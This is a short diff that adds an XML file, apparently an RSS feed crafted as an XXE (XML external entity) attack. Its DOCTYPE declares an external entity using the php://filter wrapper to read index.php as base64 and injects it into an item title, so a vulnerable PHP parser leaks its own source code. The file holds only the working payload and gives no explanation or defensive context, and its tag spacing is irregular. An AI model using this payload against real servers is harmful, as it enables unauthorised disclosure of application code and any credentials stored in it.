@@ -1,0 +1,3 @@
+<? xml version= "1.0" encoding= "utf-8" ?>
+ <!DOCTYPE root [<!ENTITY file1 SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">] > 
+< rss  xmlns:slash = "http://purl.org/rss/1.0/modules/slash/"  version = "2.0" > < channel > < item > < title > &file1; </ title > </ item > </ channel > </ rss >
